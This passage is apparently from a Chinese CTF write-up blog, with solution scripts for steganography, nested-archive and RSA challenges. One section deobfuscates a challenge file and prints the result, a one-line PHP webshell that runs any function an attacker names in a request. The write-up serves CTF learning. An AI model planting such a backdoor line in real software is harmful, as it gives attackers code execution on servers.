stegobin</span><br><span class="line">    base64str = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># stegobin将各行隐藏的二进制字符拼接在一起</span></span><br><span class="line"><span class="comment"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(binstring),<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(binstring[i:i+<span class="number">8</span>],<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</span></span><br><span class="line"><span class="comment">#flag&#123;b4se_1s_4_g0od_c0d3&#125;</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-WebShell的利用"><a href="#WEEK2-MISC-WebShell的利用" class="headerlink" title="WEEK2|MISC WebShell的利用"></a>WEEK2|MISC WebShell的利用</h5><p>官方给的poc，也可以手撕，不是很多层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;字符串&#x27;)))));&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">50</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/base64/&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = preg_replace(<span class="string">&quot;/eval/&quot;</span>,<span class="string">&quot;return &quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">eval</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">#error_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-MISC-Jvav"><a href="#WEEK2-MISC-Jvav" class="headerlink" title="WEEK2|MISC Jvav"></a>WEEK2|MISC Jvav</h5><p>java盲水印</p><p>java8 -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c .\challenge.png s.png</p><p><img src="/images/xinshengsai/image-20231123162930566.png" alt="image-20231123162930566"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>谋集团ctf</title>
      <link href="/2023/11/06/%E8%B0%8B%E9%9B%86%E5%9B%A2ctfwp/"/>
      <url>/2023/11/06/%E8%B0%8B%E9%9B%86%E5%9B%A2ctfwp/</url>
      
        <content type="html"><![CDATA[<h5 id="压缩包大师"><a href="#压缩包大师" class="headerlink" title="压缩包大师"></a>压缩包大师</h5><p>很简单的压缩包套娃，密码是压缩包的密码<br>python脚本whindows,但是解压很慢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = py7zr.SevenZipFile(r&#x27;e:\test.7z&#x27;,&#x27;r&#x27;)</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># now = &quot;D:\\vscodework\\ctf\\2023新生赛\\yasuobao\\10621.7z&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    path=<span class="string">&quot;D:\\vscodework\\ctf\\2023新生赛\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">    file = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    zfilefile = path+file</span><br><span class="line"></span><br><span class="line">    s = file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(zfilefile)</span></span><br><span class="line"></span><br><span class="line">    pwds= s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(file)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> py7zr.SevenZipFile(zfilefile, mode=<span class="string">&#x27;r&#x27;</span>, password=pwds) <span class="keyword">as</span> z:</span><br><span class="line"></span><br><span class="line">                z.extractall(path=<span class="string">&#x27;D:\\vscodework\\ctf\\2023新生赛\\yasuobao\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                z.close()</span><br><span class="line"></span><br><span class="line">                os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zfilefile,mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">            f.extractall(<span class="string">&quot;D:\\vscodework\\ctf\\2023新生赛\\yasuobao\\&quot;</span>,pwd=pwds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            f.close()</span><br><span class="line"></span><br><span class="line">        os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># zpf= zipfile.ZipFile(zfilefile)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># list = zpf.namelist()  # 得到压缩包里所有文件</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># for f in list:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     zpf.extract(f, &quot;zip&quot;, pwd=pwds.encode(&#x27;utf-8&#x27;))  # 循环解压文件到指定目录，密码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(&quot;解压成功&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>]  == <span class="string">&quot;rar&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">unrar_file_with_password</span>(<span class="params">file_path, output_path, password</span>):</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建RARFile对象</span></span><br><span class="line"></span><br><span class="line">            rar = rarfile.RarFile(file_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 设置密码</span></span><br><span class="line"></span><br><span class="line">            rar.setpassword(password)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解压RAR文件</span></span><br><span class="line"></span><br><span class="line">            rar.extractall(output_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭RARFile对象</span></span><br><span class="line"></span><br><span class="line">            rar.close()</span><br><span class="line"></span><br><span class="line">        path1 = <span class="string">&quot;D:\\vscodework\\ctf\\2023新生赛\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用函数解压带密码的RAR文件</span></span><br><span class="line"></span><br><span class="line">        unrar_file_with_password(zfilefile, path1, pwds)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(&quot;a&quot;)</span></span><br><span class="line"></span><br><span class="line">        os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>] != <span class="string">&quot;rar&quot;</span>  <span class="keyword">and</span> s[<span class="number">1</span>] != <span class="string">&quot;zip&quot;</span> <span class="keyword">and</span>  s[<span class="number">1</span>] != <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rf = rarfile.RarFile(zfilefile)  # 待解压文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># path2 =&quot;D:\\vscodework\\ctf\\2023新生赛\\yasuobao\\&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(rf)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rf.extractall(path = path2, pwd=&quot;39193&quot;)  # 解压指定文件路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rf.close()</span></span><br></pre></td></tr></table></figure><p>linux:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = py7zr.SevenZipFile(r&#x27;e:\test.7z&#x27;,&#x27;r&#x27;)</span></span><br><span class="line"></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># now = &quot;/var/www/html/check/10621.7z&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    path=<span class="string">&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">    file = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    zfilefile = path+file</span><br><span class="line"></span><br><span class="line">    s = file.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(zfilefile)</span></span><br><span class="line"></span><br><span class="line">    pwds= s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(file)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> py7zr.SevenZipFile(zfilefile, mode=<span class="string">&#x27;r&#x27;</span>, password=pwds) <span class="keyword">as</span> z:</span><br><span class="line"></span><br><span class="line">                z.extractall(path=<span class="string">&#x27;/var/www/html/check/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                z.close()</span><br><span class="line"></span><br><span class="line">                os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>] == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zfilefile,mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">            f.extractall(<span class="string">&quot;/var/www/html/check/&quot;</span>,pwd=pwds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            f.close()</span><br><span class="line"></span><br><span class="line">        os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># zpf= zipfile.ZipFile(zfilefile)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># list = zpf.namelist()  # 得到压缩包里所有文件</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># for f in list:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     zpf.extract(f, &quot;zip&quot;, pwd=pwds.encode(&#x27;utf-8&#x27;))  # 循环解压文件到指定目录，密码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(&quot;解压成功&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>]  == <span class="string">&quot;rar&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">unrar_file_with_password</span>(<span class="params">file_path, output_path, password</span>):</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建RARFile对象</span></span><br><span class="line"></span><br><span class="line">            rar = rarfile.RarFile(file_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 设置密码</span></span><br><span class="line"></span><br><span class="line">            rar.setpassword(password)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 解压RAR文件</span></span><br><span class="line"></span><br><span class="line">            rar.extractall(output_path)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            <span class="comment"># 关闭RARFile对象</span></span><br><span class="line"></span><br><span class="line">            rar.close()</span><br><span class="line"></span><br><span class="line">        path1 = <span class="string">&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用函数解压带密码的RAR文件</span></span><br><span class="line"></span><br><span class="line">        unrar_file_with_password(zfilefile, path1, pwds)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(&quot;a&quot;)</span></span><br><span class="line"></span><br><span class="line">        os.remove(zfilefile)</span><br><span class="line"></span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>] != <span class="string">&quot;rar&quot;</span>  <span class="keyword">and</span> s[<span class="number">1</span>] != <span class="string">&quot;zip&quot;</span> <span class="keyword">and</span>  s[<span class="number">1</span>] != <span class="string">&quot;7z&quot;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rf = rarfile.RarFile(zfilefile)  # 待解压文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># path2 =&quot;/var/www/html/check/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(rf)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rf.extractall(path = path2, pwd=&quot;39193&quot;)  # 解压指定文件路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rf.close()</span></span><br></pre></td></tr></table></figure><h5 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/mumuhhh/p/17789591.html</span><br><span class="line">https://blog.csdn.net/Ahi0upsec/article/details/132717024</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = getPrime(<span class="number">299</span>)</span><br><span class="line">e = inverse(d,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint1 = p &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line">hint2 = q &gt;&gt; (<span class="number">512</span>-<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint1 = <span class="subst">&#123;hint1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint2 = <span class="subst">&#123;hint2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># n = 64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line"><span class="comment"># e = 31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line"><span class="comment"># c = 44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line"><span class="comment"># hint1 = 597218086872775768003</span></span><br><span class="line"><span class="comment"># hint2 = 836339982627318976124</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span 